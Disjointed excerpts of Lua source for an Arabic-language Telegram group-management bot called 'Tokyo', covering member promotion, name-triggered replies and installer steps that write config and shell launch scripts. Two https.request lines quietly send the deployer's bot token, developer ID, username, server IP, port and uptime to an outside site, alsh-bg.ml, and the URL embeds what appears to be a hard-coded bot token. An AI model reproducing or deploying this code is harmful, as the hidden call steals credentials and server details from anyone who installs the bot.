...
https.request("https://alsh-bg.ml/TED.php?IdDavid=1734295641:AAFFyMFJJxt2MtRYtiE-WZmSqqB45A2JvKM&IdDavid=1204851735&User=CNN50"..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
...
NameBot = (DevAbs:get(David..'Abs:NameBot') or 'طوكيو')
...
if text and text:match('^'..(DevAbs:get(David..'Abs:NameBot') or "طوكيو")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevAbs:get(David..'Abs:NameBot') or "طوكيو")..' ','')
end
...
Dev_Abs(msg.chat_id_, msg.id_, 1, '✘︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CCCCCD')..')'..' ❩\n✘︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
...
if mrabs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '✘︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CCCCCD')..')'..' ❩\n✘︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
...
Dev_Abs(msg.sender_user_id_, msg.id_, 1, '✘︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "CCCCCD")..')', 1, 'md') 
...
local BotName = (DevAbs:get(David.."Abs:NameBot") or 'طوكيو')
...
if text and text == (DevAbs:get(David..'Abs:NameBot') or 'طوكيو') then 
NameBot = (DevAbs:get(David..'Abs:NameBot') or 'طوكيو')
...
ConstructorAbs = "["..Abs.first_name_.."](T.me/"..(Abs.username_ or "CCCCCD")..")"
else 
...
https.request("https://alsh-bg.ml/TED.php?IdDavid=1734295641:AAFFyMFJJxt2MtRYtiE-WZmSqqB45A2JvKM&IdDavid=1204851735&User=CNN50"..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
Create(Config, "./config.lua")   
file = io.open("TOKYO.sh", "w")  
file:write([[
#!/usr/bin/env bash
...
file:close() 
os.execute('unlink RUNABS.sh;unlink ABS;chmod +x TOKYO.sh;chmod +x Run;./Run')
else
...
DevAbs:set(David..'Abs:NameBot',(DevAbs:get(David..'Name:Bot') or 'طوكيو'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
...
Dev_Abs(msg.chat_id_, msg.id_, 1, '✘︙Channel ↬ @CCCCCD', 1, 'html')    
end 
if Sudo(msg) then 
